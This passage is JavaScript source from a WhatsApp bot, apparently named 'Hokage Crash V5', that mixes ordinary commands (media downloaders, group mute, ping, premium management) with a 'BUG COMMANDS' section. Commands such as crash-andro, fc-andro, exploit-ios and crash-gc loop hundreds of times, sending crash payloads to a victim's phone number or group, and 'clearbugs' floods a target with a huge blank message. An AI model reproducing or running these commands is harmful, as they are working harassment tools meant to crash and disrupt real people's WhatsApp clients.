case 'mute': {
    if (!m.isGroup) return reply('Group only');
    if (!isAdmins) return reply('Admin only');
    if (!isBotAdmins) return reply('Bot must be admin');

    await minato.groupSettingUpdate(m.chat, 'announcement');

    reply('🔇 Group closed');
}
break;
// ================= ( Case fb )=====================
case 'fb': {
    if (!text) return reply('❌ Enter Facebook URL');

    try {
        let res = await axios.get(`https://api.vreden.my.id/api/fbdl?url=${text}`);
        let data = res.data;

        await minato.sendMessage(m.chat, {
            video: { url: data.result.url },
            caption: '✅ Facebook Downloaded'
        }, { quoted: m });

    } catch {
        reply('❌ Error downloading Facebook video');
    }
}
break;
// ================= ( Case insta )=====================
case 'insta': {
    if (!text) return reply('❌ Enter Instagram URL');

    try {
        let res = await axios.get(`https://api.vreden.my.id/api/igdl?url=${text}`);
        let data = res.data;

        await minato.sendMessage(m.chat, {
            video: { url: data.result[0].url },
            caption: '✅ Instagram Downloaded'
        }, { quoted: m });

    } catch {
        reply('❌ Error downloading Instagram');
    }
}
break;
// ================= ( Case tiktok )=====================
case 'tiktok': {
    if (!text) return reply('❌ Enter TikTok URL');

    try {
        let res = await axios.get(`https://api.tiklydown.eu.org/api/download?url=${text}`);
        let data = res.data;

        await minato.sendMessage(m.chat, {
            video: { url: data.video.noWatermark },
            caption: '✅ TikTok Downloaded'
        }, { quoted: m });

    } catch {
        reply('❌ Error downloading TikTok');
    }
}
break;
// ================= ( Case ping )=====================
// ================= ( Case checkchannel )=====================
case "cekidch": case "idch": {
if (!text) return reply("*Put link*")
if (!text.includes("https://whatsapp.com/channel/")) return reply("*Link Is Not For Valid Channel*")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await minato.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "YES" : "NO"}
`
return reply(teks)
}
break
// ================= ( Case Self )=====================
case "self":{
  if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
  minato.public = false
 reply("*successfully changed to Self Mode*")

            }
            break;           
// ================= ( Case Owner )=================\\
    case 'owner': {
    const owners = [
        { name: "ꪶ ¡ϻ Nᴜʟʟ ꫂ", number: "2347030626048" },
        { name: "CODEBREAKER", number: "2348168666686" },
    ];
    
    const vcards = owners.map(owner => 
        `BEGIN:VCARD\nVERSION:3.0\nFN:</> ${owner.name}\nTEL;type=CELL;type=VOICE;waid=${owner.number}:+${owner.number}\nEND:VCARD`
    );
    
    await minato.sendMessage(m.chat, { 
        contacts: { 
            contacts: vcards.map(vcard => ({ vcard }))
        }
    }, { quoted: HKQuoted })
}
break;

//============================
// Case addprem and delprem
//============================
case "addprem": {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
if (!text) return reply("❌ Example: /addprem (number)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
reply(`✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖥𝗎𝗅𝗅𝗒 𝖠𝖽𝖽 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 :\n• ${user} ( 30 days )`)}
break;
//======================
case "delprem": {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
if (!text) return reply("❌ Example: /addprem (number)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
reply(removed ? `✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖥𝗎𝗅𝗅𝗒 𝖱𝖾𝗆𝗈𝗏𝖾𝖽 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖴𝗌𝖾𝗋\n• ${user}` : "❌ User is not in premium list")}
break;
//==============================
//  BUG COMMANDS
//==============================

case "delay-andro": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 234xxx`)

 
   const PROTECTED_NUMBER = ["2348168666686", "2349166339256","2347030626048"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`)
   

minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
minato.sendMessage(from, { react: { text: "⏳", key: m.key } })

await doneress();

   for (let i = 0; i < 350; i++) {

     await xxx(minato, target);
     sleep(2000)
     await MarkDelayHardInvis(minato, target);
     sleep(2000)
     await ghj(minato, target);
     sleep(2000)
     await SuperBugs(minato, target);
     sleep(2000)
     await MarkDelayHardInvis(minato, target);
     sleep(2000)
     await CV14(minato, target);
     sleep(2000)
     await MakluGwEvve(target);
     
 
 }   
minato.sendMessage(from, { react: { text: "✅", key: m.key } })
}
break

case "crash-andro": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 234xxx`)

 
   const PROTECTED_NUMBER = ["2349166339256", "2347030626048","2348168666686"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`)
   

minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
minato.sendMessage(from, { react: { text: "⏳", key: m.key } })

await doneress();

   for (let i = 0; i < 305; i++) {

     await LoseBuldo(minato, target);
     sleep(2000)
     await LoseBuldo(minato, target);
     sleep(2000)
     await LoseBuldo(minato, target);
     sleep(2000)
     await bulldozer(minato, target);
     sleep(2000)
     await bulldozer(minato, target);
     sleep(2000)
     await ziperrsedot(minato, target, true) 
   
 
 }   
minato.sendMessage(from, { react: { text: "✅", key: m.key } })
}
break


case "fc-andro": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 234xxx`)

 
   const PROTECTED_NUMBER = ["2348168666686", "2349166339256","2347030626048"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`)
   

minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
minato.sendMessage(from, { react: { text: "⏳", key: m.key } })

await doneress();

   for (let i = 0; i < 350; i++) {

     await Whatsapps(minato, target);
     sleep(2000)
     await ForcloseClick(minato, target);
     sleep(2000)
     await Whatsapps(minato, target);
     sleep(2000)
     await ForcloseClick(minato, target);
    
   
 
 }   
minato.sendMessage(from, { react: { text: "✅", key: m.key } })
}
break


case "exploit-ios": {
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*")
   if (!text) return reply(`*Format ❌*\nExample : ${command} 234xxx`)

 
   const PROTECTED_NUMBER = ["2348168666686", "2349166339256","2347030626048"];
   let victim = args[0].replace(/[^0-9]/g, "");
   
   
   if (victim === PROTECTED_NUMBER) {
         return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
   }

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   
 
       await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`)
   

minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
minato.sendMessage(from, { react: { text: "⏳", key: m.key } })

await doneress();

   for (let i = 0; i < 350; i++) {

     await IosInvisible(minato, target);
     sleep(2000)
     await StickerCrash(minato, target);
     sleep(2000)
     await IosInvisible(minato, target);
     sleep(2000)
     await StickerCrash(minato, target);
     
   
 
 }   
minato.sendMessage(from, { react: { text: "✅", key: m.key } })
}
break


case 'crash-gc': {
  if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
  if (!text) return reply(`*Example:*\n${command} https://chat.whatsapp.com/xxxxx`);
  let inviteCode = text.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)?.[1];
  if (!inviteCode) return reply("*Invalid Group Link!*");
  reply(`*Process Send Bug ${command} To Group...*`);
  await proccesCrashGroup(minato, inviteCode);
  await proccesCrashGroup(minato, inviteCode);
  await proccesCrashGroup(minato, inviteCode);
  reply(`*Success Send Bug ${command}*`);
}
break;


case 'ping':
case 'p':
  {
    let start = new Date;
    let { key } = await minato.sendMessage(from, { text: "*Checking latency.....*" }, { quoted: HKQuoted });
    let done = new Date - start;
    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`;
    
    await sleep(1000);
    await minato.sendMessage(from, { text: lod, edit: key });
  }       
  break;

case "restart": case "rst": case "restartbot": {
  await reply("_restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await reply("Restarting bot...")
  process.exit(0)
}
break

case 'request': case 'reportbug': {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
  if (!text) return reply(`Example : ${command} Hi developer one command not working`)
  textt = `*| REQUEST/BUG |*`
  teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
  teks2 = `\n\nHi ${m.sender}, Your request has been forwarded to my Owner*.\n*Please wait...*`
  
  for (let i of global.owner) {
    minato.sendMessage(i + "@s.whatsapp.net", {
      text: textt + teks1,
      mentions: [m.sender],
    }, {
      quoted: HKQuoted,
    })
  }
  
  minato.sendMessage(m.chat, {
    text: textt + teks2 + teks1,
    mentions: [m.sender],
  }, {
    quoted: HKQuoted,
  })
}
break;

case 'clearbugs': {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
if (!text) return reply(`*Invalid format ❌*\nExample: ${command} 234xxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
minato.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`}, { quoted: HKQuoted })
}
break;

case 'support': {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
    let support = `
*</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅 𝚂𝚄𝙿𝙿𝙾𝚁𝚃*

*𝙱𝙾𝚃 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 :* </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅
*𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 :* https://t.me/MinatoDevNinja

*𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 𝙲𝙷𝙰𝙽𝙽𝙴𝙻*
https://whatsapp.com/channel/0029VbAj0uCLikg6Pfjs4i2u

> 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅`
    minato.sendMessage(m.chat, { 
        text: support,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`,
                body: `</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/s51p6p.jpg',
                thumbnail: ``,
                sourceUrl: `https://whatsapp.com/channel/0029VbAj0uCLikg6Pfjs4i2u`
            }
        }
    }, { quoted: HKQuoted });
};
break;

   

//=============≠≠==========
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}